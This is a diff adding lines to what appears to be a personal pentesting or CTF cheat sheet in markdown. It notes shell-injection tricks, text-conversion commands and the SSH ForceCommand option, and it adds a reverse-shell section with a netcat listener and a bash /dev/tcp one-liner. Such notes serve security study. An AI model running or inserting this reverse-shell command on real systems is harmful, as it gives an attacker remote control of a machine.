@@ -124,3 +124,15 @@ if we use test or [   ] with an argument that is not quoted, we can inject condi
 - `tr -d [char]` -> delete all instance of [char]
 - `tr -s [char_array] [char]` -> replace all char in [char_array] with [char]
 - `xxd -r -p` -> convert hex to ascii
+
+## SSH
+
+Check /etc/ssh/ssh_config for the ssh config
+- ForceCommand:
+  - Runs a command when a user connects 
+  
+
+## Reverse shell:
+- Listener(on my machine): `nc -nvlp [PORT]`
+- Senders:
+  - Bash: `bash  -i >& /dev/tcp/[IP]/[PORT] 0>&1 `
